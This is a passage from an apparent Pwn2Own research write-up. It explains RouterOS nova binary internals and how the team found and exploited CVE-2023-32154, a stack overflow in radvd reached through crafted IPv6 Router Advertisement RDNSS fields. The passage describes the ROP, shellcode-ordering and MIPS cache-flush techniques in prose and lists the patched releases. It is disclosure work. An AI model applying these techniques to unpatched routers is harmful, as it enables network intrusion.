&lt;p&gt;However, the basic handler class is not the most used one in nova binaries, but rather a derivative of it. Derived classes can be used to store multiple objects of a single type, similar to C++ STL containers.&lt;/p&gt;

&lt;p&gt;For example, when a user creates a DHCP server through the web panel, a nova message with the command “add object” is sent to handler 0 of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process, which then creates a dhcp server object. And the object will be stored in a tree of handler 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The handler 0 here is an instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; is a derived class of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handler&lt;/code&gt;. Since the command is “add object”, it triggers the member function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap::cmdAddObj&lt;/code&gt;, which calls a function at offset 0x7c in handler 0’s vtable. And that function is actually the constructor of the object contained in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt;. For example, if the developer defines handler 0 to be of type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&amp;lt;string&amp;gt;&lt;/code&gt;, then the function at offset 0x7c is the constructor of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The offset of the constructor of the inner object in the vtable is different for each derived class, and locating the constructor to determine what type of objects are contained in the derived class can be done by reversing their individual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; function.&lt;/p&gt;

&lt;h3 id=&quot;ipc-and-something-other-than-ipc&quot;&gt;IPC, and something other than IPC&lt;/h3&gt;

&lt;p&gt;Some of the functions in RouterOS are not driven by IPC. Take the two layer 2 discovery protocols, CDP and LLDP, implemented in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; program as an example.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;When starting the two services, handler 0 will be responsible for calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::createPacketReceiver&lt;/code&gt; to open the sockets and register the callback functions for CDP and LLDP.&lt;/li&gt;
  &lt;li&gt;In each iteration of the Looper, call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to check if the sockets of CDP and LLDP have received any packets.&lt;/li&gt;
  &lt;li&gt;If packets are received, the corresponding callback function will be called to handle the packets.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What CDP’s callback does is very simple: it makes sure that the interface that received the packet is allowed, and if it is, it parses the packet and stores the information directly into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ASecMap&lt;/code&gt; instead of using a nova message, and then returns.
&lt;img src=&quot;/assets/img/blog/20240524/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It follows that IPC has no ability to trigger any function of CDP or LLDP other than to turn on CDP or LLDP services (which are turned on by default), so it is likely that previous research focused on IPC has not tested the program logic of such implementation.&lt;/p&gt;

&lt;h2 id=&quot;the-story-of-pre-auth-rce&quot;&gt;The Story of Pre-Auth RCE&lt;/h2&gt;

&lt;p&gt;With the knowledge of RouterOS, a surprising accident led us to a long hidden vulnerability.&lt;/p&gt;

&lt;p&gt;One day, when we plugged and unplugged the network cable as usual for reversing and debugging on RouterOS, we found that the log file recorded that the program &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; had crashed several times! So we tried plugging and unplugging the cable to manually reproduce the crash so that we could use the debugger to locate the problem, but after thousands of plugs and unplugs, we still couldn’t determine the conditions under which the crash was occurring, and it appeared to be just a random crash.&lt;/p&gt;

&lt;p&gt;After a period of trial and error, we tried to find out where the crash occurred by static reversing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; rather than blindly trying. Though we still couldn’t find the root cause of the crash in the end, we found another vulnerability in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; after reviewing the core logic in binary with the benefit of our understanding of the nova binary.&lt;/p&gt;

&lt;p&gt;Before describing this vulnerability, let’s first explain what the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process does.&lt;/p&gt;

&lt;h3 id=&quot;slaac-stateless-address-auto-configuration-&quot;&gt;SLAAC (Stateless Address Auto-Configuration )&lt;/h3&gt;

&lt;p&gt;In short, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is a service that handles SLAAC for IPv6.&lt;/p&gt;

&lt;p&gt;In a SLAAC environment, suppose a computer wants to get an IPv6 address to access the Internet, it will first broadcast an RS (Router Solicitation) request to all routers. After the router receives the RS, it will broadcast the network prefix through RA (Router Advertisement); computers receiving the RA can take the network prefix then combine it with the EUI-64 to decide what IPv6 address they’re going to use for connecting to the Internet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If an ISP or network administrator wants to assign a network segment to a user, so that the user can assign the address to the user-managed machines. How to assign a segment to the user when only using SLAAC without DHCP? Because SLAAC does not have a way to delegate directly, this is how it usually works:&lt;/p&gt;

&lt;p&gt;Suppose there is an upstream router: Router A, which belongs to an ISP or a network administrator, a user-managed Router B, and a user-managed computer. The ISP or the network administrator will notify the user via email in advance about a /48 network prefix assigned to the user, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2001:db8::/48&lt;/code&gt; in this case. Users can set it on Router B, then when the computer sends RS to Router B, Router B will put this prefix into RA for return, this prefix is called routed prefix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to make Router B be able to communicate with Router A, it also needs to get network prefix from Router A for an IPv6 address of its own. And the network prefix that Router B gets from Router A is called a link prefix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-execution-flow-of-the-radvd&quot;&gt;The execution flow of the radvd&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;When the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process is started, the socket used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is opened by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ThinRunner::addSocket&lt;/code&gt; and the corresponding callback function is registered.
&lt;img src=&quot;/assets/img/blog/20240524/29.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;In each iteration of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Looper&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radavd&lt;/code&gt;, the socket is checked by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to see if it has received any packets.
&lt;img src=&quot;/assets/img/blog/20240524/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;If any packets are received, the corresponding callback function will be called to process the packets.
&lt;img src=&quot;/assets/img/blog/20240524/31.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In the callback function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rardvd&lt;/code&gt;, it will first check if the packet is a legitimate RA or RS, if it’s RA, store the information, if it’s RS, start broadcasting RA in LAN.&lt;/p&gt;

&lt;p&gt;There are total three cases in which the RouterOS broadcasts the network prefix:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Received RS from LAN&lt;/li&gt;
  &lt;li&gt;Received RA from WAN&lt;/li&gt;
  &lt;li&gt;Timed broadcast of RA packets on LAN (default random broadcast after 200~600 seconds)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;But we didn’t find the code that’s responsible for case 2 in the callback function by statically reversing. At that time we were not sure why, it is actually related to the subscription mechanism in the RouterOS IPC, which we will explain in a later chapter. However, there are two other cases that we can find out directly through static analysis.&lt;/p&gt;

&lt;p&gt;In case 1, when an RS is received from the LAN, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; to broadcast the RA packet:
&lt;img src=&quot;/assets/img/blog/20240524/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In case 2, handler 1 will register a timer, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt;, after initialization:
&lt;img src=&quot;/assets/img/blog/20240524/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt; is used to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; at regular intervals to broadcast packets:
&lt;img src=&quot;/assets/img/blog/20240524/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2023-32154&quot;&gt;CVE-2023-32154&lt;/h2&gt;

&lt;p&gt;After digging deeper into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt;, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; has a vulnerability in handling DNS advisory. First, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will store the DNS advisory from the RA received from the upstream router (the data structure is a tree), and when it wants to broadcast the RA to the LAN, these DNS will also be wrapped in the RA and broadcast to the LAN.&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, it is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; function that expands the tree and puts it into the ICMPv6 packet. In the following figure, the first parameter of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RA_raw&lt;/code&gt;, is a buffer of 4096 bytes, which is the final ICMPv6 packet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Stepping into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt;, we can immediately see that there may be a stack buffer overflow here. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; puts DNS into ICMPv6 packets via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; without any boundary check, and as long as the DNS advisory is big enough, it can trigger a stack buffer overflow.
&lt;img src=&quot;/assets/img/blog/20240524/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The DNS records used here come from the RDNSS field in the RA packet, but according to the RFC, we can find that the field used to describe the length of RDNSS is only 8-bit. It can cover only 255*16 bytes at most, and this length is insufficient for us to overwrite the return address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But if this is not the first time the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; received RA, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; needs to mark the old DNS as expired in the next packet, so we can actually cover twice the length, which is 255*16*2 bytes. That is enough for us to overwrite the return address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;attacking&quot;&gt;Attacking&lt;/h2&gt;

&lt;p&gt;Now, the attacker only needs to send two crafted RA packets with RDNSS field length of 255 to the target RouterOS, and the attacker can control the execution flow of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; program through the IPv6 address in the RDNSS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-protection-of-binaries&quot;&gt;The Protection of Binaries&lt;/h3&gt;

&lt;p&gt;Since the architecture of target RouterOS is MIPS architecture, the CPU doesn’t support NX, but other protections are also not enabled.&lt;/p&gt;

&lt;p&gt;So it’s just a matter of finding a good ROP gadget and letting the execution flow eventually jump to the shellcode we place on the stack, easy peasy lemon squeezy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-constraint-of-shellcode&quot;&gt;The Constraint of Shellcode&lt;/h3&gt;

&lt;p&gt;However, there are actually quite a number of limitations in the process of constructing an exploit, for example, since IPv6 addresses are stored in a tree structure, they are sorted before being placed on the stack, so we need to make sure that the payload we build remains the same after sorting.&lt;/p&gt;

&lt;p&gt;The simplest way to do this is to make the IPv6 prefix to be a serial number, which ensures that the contents of our payload are in order, and that we can accurately jump to the shellcode through the ROP gadget. When writing the shellcode, we just need to construct the suffix of each address as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt;, so that we can skip the non-executable  serial number.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, due to the delay slot in MIPS, the CPU will actually execute the next instruction of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; instruction first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we have to move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; forward, but since we can’t use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; command in the delay slot, the payload will be a pain to construct, and may exceed the length we can use, which is basically a bad idea.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, this is a common beginner level problem in CTF. All we need is to make the prefix of IPv6 address a legal instruction that does not affect the execution result. We change the prefix to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 3&lt;/code&gt;…… and so on. In addition to the payloads being sorted, it also saves the space that would otherwise be used for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; instructions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But since we didn’t leak the stack address, and since we can’t find any gadgets available to move the stack address from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$sp&lt;/code&gt; register to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t9&lt;/code&gt; register, what we’ve done here is to first write the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jalr $sp&lt;/code&gt; instruction to memory via a ROP gadget, and then jump to it and execute it with a ROP gadget, which then directs the flow to the shellcode that we’ve constructed, and that sounds pretty good:
&lt;img src=&quot;/assets/img/blog/20240524/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But this is not enough to run shellcode, because MIPS has two different cache for memory access.&lt;/p&gt;

&lt;h3 id=&quot;cache&quot;&gt;Cache&lt;/h3&gt;

&lt;p&gt;MIPS has two caches: I-cache (instruction cache) and D-cache (data cache).&lt;/p&gt;

&lt;p&gt;When we write the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; instruction to the memory, it’s actually written to D-cache.
&lt;img src=&quot;/assets/img/blog/20240524/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we control the execution flow to jump on the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt;, the processor will first check whether the instruction at this address is in the I-cache or not, and since we jump to a data section, the cache will always miss it. And so, the contents of the memory will be loaded into the I-cache.
&lt;img src=&quot;/assets/img/blog/20240524/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, since the contents of the D-cache have not been written back to memory, I-cache will only copy a bunch of null bytes from memory, which is nop in MIPS, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; only runs a bunch of nop until it crashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we need to make the processor write the contents of the D-cache back to memory, and there are two ways to do this: a context switch or exhausting the D-cache space (32 KB).&lt;/p&gt;

&lt;p&gt;Triggering a context switch is easier, but there is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; that we can use to trigger a context switch, and while other functions can trap into the kernel, the chances of a context switch occurring are not very high. In order to compete for the Pwn2Own, it is necessary to have a consistent attack that is close to 100% successful. Therefore, we turned to find a way to exhaust the 32kb D-cache.&lt;/p&gt;

&lt;p&gt;First , a simple check shows that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radomize_va_space&lt;/code&gt; variable of RouterOS is 1, which means that the memory address of the heap is not random, so we don’t need a leak to know where the heap is. We just need to find a way to make the heap allocate enough space, and then write some gibberish on it to deplete the 32kb D-cache.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, since there are no good ROP gadgets, such a payload will need too many ROP gadgets, and eventually the payload length may exceed the length we can cover.&lt;/p&gt;

&lt;p&gt;Luckily, as mentioned earlier, DNS itself is stored in a tree structure, so it already occupies a large chunk of memory in the heap. Through the step-by-step execution of gdb, we can make sure that by the time DNS is being processed, the heap is already bigger than 32kb, so we just need to call memcpy to write 32kb of gibberish to the heap through the GOT hijack and that’s it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, our exploit is complete:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Combined with another Canon printer vulnerability we found for Pwn2Own, the attack flow would be:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The attacker, as a bad neighbor of the router, sends crafted ICMPv6 packets to it&lt;/li&gt;
  &lt;li&gt;After successfully controlling the router, we perform port forwarding to direct the payload to the Canon printer on the LAN.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In a Pwn2Own environment, the network environment can be simplified a bit as follows:
&lt;img src=&quot;/assets/img/blog/20240524/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;debugging-for-exploit&quot;&gt;Debugging for Exploit&lt;/h2&gt;

&lt;p&gt;Just when we thought we had the $100,000 prize in the pocket, something unexpected happened: our exploit failed on Ubuntu, whether it was a virtual machine in MacOS or an Ubuntu machine; and Pwn2Own officials, who basically used Ubuntu to execute our exploit, so we had to solve this problem.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tried running the exploit on MacOS and recording the network traffic, then replaying the traffic on Ubuntu, and we can observe that the replay fails:
&lt;img src=&quot;/assets/img/blog/20240524/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also tried running the exploit on Ubuntu and recording the network traffic, of course it failed on Ubuntu. But when we replayed the failed traffic on MacOS, it succeeded:
&lt;img src=&quot;/assets/img/blog/20240524/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Up to this point, we guessed that one of the OSes reordered the packets before sending them out, and that might have been done after Wireshark captured the packets. So we wrote a sniffer and put it on the router to monitor the traffic, and the result should be very reliable since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_PACKET&lt;/code&gt; type of sockets are not affected by the firewall rules:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the packets recorded from both sides are &lt;strong&gt;exactly the same&lt;/strong&gt; ……&lt;/p&gt;

&lt;p&gt;So, apparently I’m the bus factor now. Exploit has only worked on my macOS so far, and if the situation remains, the last resort would be to fly myself to Toronto with my Mac laptop and do the attack on site with my own laptop. But there’s no way we’re going to leave this problem of unknown cause unattended, who knows if it might happen to my laptop during the Pwn2Own as well, and that would be a real loss.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a few careful reviews, we finally know the cause of the problem: speed. Since the time window between the two RA packets is not that big, it’s hard to tell from the Wireshark timeline, but if you do some math, you’ll see that the difference in time between the two packets &lt;strong&gt;is 390 times&lt;/strong&gt;. So the problem is not with Ubuntu, it’s because the Mac sent the two packets too fast, and accidentally triggered the race condition in radvd (plus I didn’t properly calculate how many bytes it takes to overwrite the return address, I just wrote all the gibberish on it and did a pattern match. So the offset is only correct under the race condition).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The solution is to sleep for a while between sending two RA packets and fix the offset in the payload, which will stabilize our attack with a 100% chance of success.&lt;/p&gt;

&lt;h3 id=&quot;fix&quot;&gt;Fix&lt;/h3&gt;

&lt;p&gt;This vulnerability has been fixed in the following releases:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8, 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the same time, we also found that this vulnerability has existed since RouterOS v6.0. From the official website can be found 6.0 release date is 2013-05-20, that is to say, this vulnerability has existed there &lt;strong&gt;nine years&lt;/strong&gt;, but no one has found him.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Echoing our initial thought, “No one with sanity would like to dive into the details of nova binary”, Q.E.D.&lt;/p&gt;

&lt;h2 id=&quot;the-race-condition&quot;&gt;The Race Condition&lt;/h2&gt;

&lt;p&gt;But how did this race condition that prevents us from easily earning $100,000 happen? As mentioned above, nova binary has a Looper that loops for dealing with events, i.e. it’s a single thread program, so what’s the race condition all about? (Some nova binary is multi-fiber, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; isn’t.)&lt;/p&gt;

&lt;p&gt;I didn’t mention that when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; parse the RA packets received from WAN, the DNS is stored in a “vector”, but when preparing the RA packets for broadcasting on LAN, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; expands a “tree” with DNS stored in it, so what is the relationship between this vector and the tree?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s why we didn’t find the logic “broadcasts RA packets to the LAN when it receives RA from the WAN” in the callback, because it’s the result of the interaction between the two processes.&lt;/p&gt;

&lt;p&gt;If we take a closer look at what the callback does, we can see that there is an array that holds an object called the “remote object”. The code looks intuitive, it iterates over a vector of DNS addresses, calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::roDNS&lt;/code&gt; once for each DNS address, and saves the result of the function execution in the and saves the result of the function execution in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS_remoteObject&lt;/code&gt; vector.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-object&quot;&gt;Remote Object&lt;/h3&gt;

&lt;p&gt;So what is a remote object? Remote object is a mechanism used in RouterOS to share resources across processes, one process is responsible for storing this shared resource, then another process can send requests to the process responsible for storing it to make additions, deletions, and modifications by specifying the ids. For example, the DNS remote object is actually placed in handler 2 of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; process, while handler 1 of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; simply keeps the ids of these objects.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;subscription-and-notification&quot;&gt;Subscription and Notification&lt;/h3&gt;

&lt;p&gt;When a remote object is updated, some process may want to respond, so the nova binary can subscribe to other nova binary in advance. Take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; for example, handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; is responsible for managing the ipv6 address pool, the dhcp process subscribes to handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt;, so when there are changes in the ipv6 address pool, dhcp can check whether they need to be processed further, such as shutting down a dhcp server.&lt;/p&gt;

&lt;p&gt;The subscription behavior is achieved by sending a nova message to the binary that wants to subscribe, with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_NOTIFYCMD&lt;/code&gt; that contains the specific conditions that it wants to be notified about.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When another process adds an object to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt;, handler 1’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; function will be executed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In most cases, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendNotifies&lt;/code&gt; to notify subscribers who have subscribed to the 0xfe000b event that their subscribed objects have been altered, so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; here sends a nova message to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process informing it of the result of the object being altered.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After understanding the subscription mechanism, we can more fully understand the interaction between radvd and the resolver as follows:&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives the RA packet from the WAN, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; for each IPv6 address. Handler 4 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; handles this request and creates the corresponding ipv6 object in handler 2. Then, because handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; subscribes to handler 2 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, handler 2 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; pushes all the DNS addresses that it has to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, then handler 1 constructs a RA packet based on the DNS address he received, and then broadcasts the packet on the LAN.&lt;/p&gt;

